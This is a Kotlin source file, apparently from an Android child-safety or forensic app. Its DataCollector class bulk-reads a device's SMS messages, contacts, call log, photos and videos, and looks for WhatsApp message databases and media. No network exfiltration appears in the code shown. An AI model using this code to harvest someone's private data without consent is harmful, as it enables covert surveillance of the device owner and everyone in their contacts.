package com.safechild.agent

import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.os.Environment
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Telephony
import java.io.File

/**
 * Collects forensic data from the device
 */
class DataCollector(private val context: Context) {

    /**
     * Collect SMS messages
     */
    fun collectSMS(): List<SmsMessage> {
        val messages = mutableListOf<SmsMessage>()

        try {
            val cursor: Cursor? = context.contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                arrayOf(
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.DATE,
                    Telephony.Sms.TYPE
                ),
                null,
                null,
                "${Telephony.Sms.DATE} DESC"
            )

            cursor?.use {
                while (it.moveToNext()) {
                    val address = it.getString(0) ?: ""
                    val body = it.getString(1) ?: ""
                    val date = it.getLong(2)
                    val type = it.getInt(3)

                    messages.add(SmsMessage(address, body, date, type))
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }

        return messages
    }

    /**
     * Collect contacts
     */
    fun collectContacts(): List<Contact> {
        val contacts = mutableListOf<Contact>()

        try {
            val cursor = context.contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                null,
                null,
                null,
                ContactsContract.Contacts.DISPLAY_NAME + " ASC"
            )

            cursor?.use {
                while (it.moveToNext()) {
                    val id = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts._ID))
                    val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME)) ?: ""

                    val phoneNumbers = mutableListOf<String>()
                    val emails = mutableListOf<String>()

                    // Get phone numbers
                    val hasPhone = it.getInt(it.getColumnIndexOrThrow(ContactsContract.Contacts.HAS_PHONE_NUMBER))
                    if (hasPhone > 0) {
                        val phoneCursor = context.contentResolver.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            arrayOf(id),
                            null
                        )
                        phoneCursor?.use { pc ->
                            while (pc.moveToNext()) {
                                val number = pc.getString(
                                    pc.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)
                                )
                                phoneNumbers.add(number)
                            }
                        }
                    }

                    // Get emails
                    val emailCursor = context.contentResolver.query(
                        ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
                        arrayOf(id),
                        null
                    )
                    emailCursor?.use { ec ->
                        while (ec.moveToNext()) {
                            val email = ec.getString(
                                ec.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Email.ADDRESS)
                            )
                            emails.add(email)
                        }
                    }

                    contacts.add(Contact(name, phoneNumbers, emails))
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }

        return contacts
    }

    /**
     * Collect call log
     */
    fun collectCallLog(): List<CallLogEntry> {
        val callLogs = mutableListOf<CallLogEntry>()

        try {
            val cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.CACHED_NAME,
                    CallLog.Calls.DATE,
                    CallLog.Calls.DURATION,
                    CallLog.Calls.TYPE
                ),
                null,
                null,
                "${CallLog.Calls.DATE} DESC"
            )

            cursor?.use {
                while (it.moveToNext()) {
                    val number = it.getString(0) ?: ""
                    val name = it.getString(1)
                    val date = it.getLong(2)
                    val duration = it.getInt(3)
                    val type = it.getInt(4)

                    callLogs.add(CallLogEntry(number, name, date, duration, type))
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }

        return callLogs
    }

    /**
     * Collect WhatsApp data - databases and media
     */
    fun collectWhatsAppData(): WhatsAppData {
        var databasePath: String? = null
        val mediaFiles = mutableListOf<String>()
        var backupFound = false

        try {
            // Check for WhatsApp database locations
            val possibleDbPaths = listOf(
                // Internal storage (requires root or backup)
                "/data/data/com.whatsapp/databases/msgstore.db",
                // External storage backup
                "${Environment.getExternalStorageDirectory()}/WhatsApp/Databases/msgstore.db.crypt14",
                "${Environment.getExternalStorageDirectory()}/WhatsApp/Databases/msgstore.db.crypt12",
                // Android/media location (newer WhatsApp versions)
                "${Environment.getExternalStorageDirectory()}/Android/media/com.whatsapp/WhatsApp/Databases/msgstore.db.crypt14",
                "${Environment.getExternalStorageDirectory()}/Android/media/com.whatsapp/WhatsApp/Databases/msgstore.db.crypt12"
            )

            for (path in possibleDbPaths) {
                val file = File(path)
                if (file.exists() && file.canRead()) {
                    databasePath = path
                    backupFound = true
                    break
                }
            }

            // Collect WhatsApp media files
            val mediaLocations = listOf(
                "${Environment.getExternalStorageDirectory()}/WhatsApp/Media",
                "${Environment.getExternalStorageDirectory()}/Android/media/com.whatsapp/WhatsApp/Media"
            )

            for (location in mediaLocations) {
                val mediaDir = File(location)
                if (mediaDir.exists() && mediaDir.isDirectory) {
                    collectFilesRecursively(mediaDir, mediaFiles, maxFiles = 1000)
                    break
                }
            }

        } catch (e: Exception) {
            e.printStackTrace()
        }

        return WhatsAppData(databasePath, mediaFiles, backupFound)
    }

    /**
     * Collect media files (photos and videos)
     */
    fun collectMediaFiles(): List<MediaFile> {
        val mediaFiles = mutableListOf<MediaFile>()

        try {
            // Query images
            val imageUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            val imageCursor = context.contentResolver.query(
                imageUri,
                arrayOf(
                    MediaStore.Images.Media.DATA,
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.SIZE,
                    MediaStore.Images.Media.MIME_TYPE,
                    MediaStore.Images.Media.DATE_ADDED
                ),
                null,
                null,
                "${MediaStore.Images.Media.DATE_ADDED} DESC"
            )

            imageCursor?.use {
                var count = 0
                while (it.moveToNext() && count < 500) { // Limit to 500 images
                    val path = it.getString(0) ?: continue
                    val name = it.getString(1) ?: ""
                    val size = it.getLong(2)
                    val mimeType = it.getString(3) ?: "image/*"
                    val dateAdded = it.getLong(4)

                    mediaFiles.add(MediaFile(path, name, size, mimeType, dateAdded))
                    count++
                }
            }

            // Query videos
            val videoUri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI
            val videoCursor = context.contentResolver.query(
                videoUri,
                arrayOf(
                    MediaStore.Video.Media.DATA,
                    MediaStore.Video.Media.DISPLAY_NAME,
                    MediaStore.Video.Media.SIZE,
                    MediaStore.Video.Media.MIME_TYPE,
                    MediaStore.Video.Media.DATE_ADDED
                ),
                null,
                null,
                "${MediaStore.Video.Media.DATE_ADDED} DESC"
            )

            videoCursor?.use {
                var count = 0
                while (it.moveToNext() && count < 100) { // Limit to 100 videos
                    val path = it.getString(0) ?: continue
                    val name = it.getString(1) ?: ""
                    val size = it.getLong(2)
                    val mimeType = it.getString(3) ?: "video/*"
                    val dateAdded = it.getLong(4)

                    mediaFiles.add(MediaFile(path, name, size, mimeType, dateAdded))
                    count++
                }
            }

        } catch (e: Exception) {
            e.printStackTrace()
        }

        return mediaFiles
    }

    private fun collectFilesRecursively(dir: File, list: MutableList<String>, maxFiles: Int) {
        if (list.size >= maxFiles) return

        dir.listFiles()?.forEach { file ->
            if (list.size >= maxFiles) return

            if (file.isDirectory) {
                collectFilesRecursively(file, list, maxFiles)
            } else if (file.isFile && file.canRead()) {
                // Only add media files
                val ext = file.extension.lowercase()
                if (ext in listOf("jpg", "jpeg", "png", "gif", "mp4", "3gp", "mkv", "opus", "mp3", "pdf")) {
                    list.add(file.absolutePath)
                }
            }
        }
    }
}
